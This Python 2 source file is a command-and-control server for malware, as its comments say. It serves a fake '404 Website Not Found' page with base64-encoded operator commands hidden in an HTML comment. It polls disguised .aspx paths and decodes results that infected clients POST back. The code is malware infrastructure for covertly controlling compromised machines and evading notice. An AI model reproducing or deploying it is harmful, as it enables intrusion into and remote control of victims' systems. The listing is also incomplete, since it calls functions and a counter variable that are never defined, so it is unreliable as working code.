import string
import BaseHTTPServer
import cgi #Handles the POST request parsing issues
from os import curdir, sep #Allows a few file directory methods and features

server_host = 'localhost'
server_port = 80

class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
        def do_HEAD(p): #Handles Header requests; Not necessary as the malware has no HEAD requests
                p.send_response(200)
                p.send_header("Content-type", "text/html")
                p.end_headers()
                
        def do_GET(p): #Handles any GET requests by the malware

                if p.path.startswith("/foot.aspx?"): #Checks to see if a command request or a file request is being made
                    try:
                        #Opens the header and footer HTML code
                        begin = open("index.html","r")
                        end = open("index2.html","r")
                        p.send_response(200)
                        p.send_header("Content-type", "text/html")
                        p.end_headers()
                        p.wfile.write(begin.read()+end.read())
                        begin.close()
                        end.close()
                        #requested = open("index.html","w")
                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
                        #requested.close()
                    except IOError:
                        p.send_error(404,'File Not Found')
                elif p.path.startswith("/bask.aspx?"): #Checks to see if a command request or a file request is being made
                    try:
                        #Opens the header and footer HTML code
                        begin = open("index.html","r")
                        end = open("index2.html","r")
                        p.send_response(200)
                        p.send_header("Content-type", "text/html")
                        p.end_headers()
                        p.wfile.write(begin.read()+end.read())
                        begin.close()
                        end.close()
                        #requested = open("index.html","w")
                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
                        #requested.close()
                    except IOError:
                        p.send_error(404,'File Not Found')
                elif p.path.startswith("/base.aspx?"): #Checks to see if a command request or a file request is being made
                    try:
                        #Opens the header and footer HTML code
                        begin = open("index.html","r")
                        end = open("index2.html","r")
                        p.send_response(200)
                        p.send_header("Content-type", "text/html")
                        p.end_headers()
                        p.wfile.write(begin.read()+end.read())
                        begin.close()
                        end.close()
                        #requested = open("index.html","w")
                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
                        #requested.close()
                    except IOError:
                        p.send_error(404,'File Not Found')
                else: #Handles index requests
                    try:
                        #Opens the header and footer HTML code
                        begin = open("index.html","r")
                        end = open("index2.html","r")
                        p.send_response(200)
                        p.send_header("Content-type", "text/html")
                        p.end_headers()
                        p.wfile.write(begin.read()+end.read())
                        begin.close()
                        end.close()
                        #requested = open("index.html","w")
                        #requested.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
                        #requested.close()
                        return
                    except IOError:
                        p.send_error(404,'File Not Found')

        def do_POST(p): #Handles POST requests
                    global counter;
                    if counter == 1:
                        if p.headers.dict.has_key('content-length'): # Source [1] edited slightly to work for my uses
                            length = string.atoi(p.headers.dict["content-length"])
                            post_data = p.rfile.read(length)
                            dec_post = base_64code("d",post_data);
                            if dec_post != "ERROR":
                                print dec_post;
                        p.send_response(200)
                        p.end_headers()
                        user_command = get_command(); #Pauses Get Request Handling to ask for a command
                        enc_cmd = base_64code("e",user_command); #Encodes the command
                        cat_cmd = "<!--"+enc_cmd+"--!>" #Creates the comment based command
                        command_file = open("index.html","w"); # Opens the html file that holds the commands
                        command_file.write(cat_cmd);
                        command_file.write('<html><head><TITLE>404 - Website Not Found</TITLE></head><body bgcolor="WHITE">HTTP Error 404 - Content not found <p>The content you have requested has either been removed or the server is currently down for maintenance. Please try to contact the server at a later time.</BODY></html>')
                        command_file.close();
                        if counter == 2:
                            counter = 0
                    elif counter == 0 or counter == 2:
                        p.send_response(200)
                        p.end_headers()
                        if p.headers.dict.has_key('content-length'): # Source [1] edited slightly to work for my uses
                            length = string.atoi(p.headers.dict["content-length"])
                            post_data = p.rfile.read(length)
                            dec_post = base_64code("d",post_data);
                            if dec_post != "ERROR":
                                print dec_post;

server_class = BaseHTTPServer.HTTPServer
httpd = server_class((server_host, server_port), Handler)

try:
        print "Server up";
        httpd.serve_forever()
        
except KeyboardInterrupt:
        pass
httpd.server_close()
